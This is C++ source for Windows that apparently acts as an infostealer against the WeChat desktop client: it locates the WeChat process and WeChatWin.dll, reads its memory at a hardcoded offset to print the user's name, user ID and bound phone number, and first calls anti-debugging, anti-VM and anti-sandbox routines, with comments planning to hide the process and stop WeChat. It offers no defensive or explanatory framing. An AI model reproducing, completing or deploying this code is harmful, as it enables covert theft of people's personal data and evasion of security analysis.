#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include <iostream>
#include "hook.h"
using namespace std;


#define WeChatNameOffset 0x0
#define WeChatBaseAddressOffset 0x2E2CDA0

void ReadMemory(DWORD pid, int DllBaseAddress) {
    //Read WeChat.exe Memory Wechat name/ WeChat Binding Phone
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    char* FirstOffset[13] = {};
    int First = DllBaseAddress + WeChatBaseAddressOffset;
    ReadProcessMemory(pHandle, (LPCVOID)First, &FirstOffset, sizeof(char) * 200, NULL);
    printf("Wechat Name : %X\n", *(FirstOffset + 42));
    printf("WeChat UserID : %s\n", FirstOffset);
    printf("WeChat Binding Phone: %s\n", FirstOffset + 6);
    CloseHandle(pHandle);
    return;
}


DWORD GetProcessPid() {
    //Get Wechat.exe Pid
    PROCESSENTRY32  info;
    info.dwSize = sizeof(PROCESSENTRY32);
    bool Found;
    HANDLE ProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (ProcessSnap == NULL) {
        cout << "Create Snap Failed" << endl;
        return -1;
    }
    bool pSnap = Process32First(ProcessSnap, &info);
    while (pSnap)
    {
        if (!wcscmp(info.szExeFile, L"WeChat.exe")) {
            return info.th32ProcessID;
        }
        pSnap = Process32Next(ProcessSnap, &info);
        //printf("Processname:%s\n",info.szExeFile);
    }
    CloseHandle(ProcessSnap);
    return 0;
}

LPVOID GetModuleBaseAddress(DWORD pid)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (INVALID_HANDLE_VALUE == hSnapshot)
    {
        return 0;
    }
    MODULEENTRY32 mi;
    mi.dwSize = sizeof(MODULEENTRY32);
    BOOL  bRet = Module32First(hSnapshot, &mi);
    while (bRet)
    {
        if (!wcscmp(mi.szModule, L"WeChatWin.dll")) {
            return mi.modBaseAddr;
        }
        bRet = Module32Next(hSnapshot, &mi);
    }
    CloseHandle(hSnapshot);
    return 0;
}


int main() {

    //First To Defendense Av Debuger Vmware
    Anti_Cloudware();
    Anti_Debug();
    Anti_Vmware();
    //Hider Process 
    
    //Detection  Wechat.exe Executing...
    // 
    //Secend To Get Wechat Base Infomation
    DWORD pid = GetProcessPid();
    LPVOID BaseAddress = GetModuleBaseAddress(pid);
    ReadMemory(pid, (int)BaseAddress);

    //Third Use SEH +VEH to Stop Wechat 




    return 0;
}